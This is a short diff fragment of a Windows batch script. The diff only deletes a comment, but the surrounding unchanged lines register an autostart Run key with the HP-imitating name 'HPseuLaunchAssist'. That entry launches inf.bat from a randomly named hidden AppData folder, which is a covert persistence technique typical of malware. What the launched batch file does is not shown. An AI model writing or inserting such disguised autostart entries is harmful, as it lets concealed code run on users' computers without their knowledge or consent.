@@ -97,7 +97,6 @@ if %errorlevel% equ 0 (
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HPseuLaunchAssist" /t REG_SZ /d "%USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf\inf.bat" /f
 goto end
 :end
-:: starts the batch file in the background for checking
 echo script done.
 pause
 exit /b
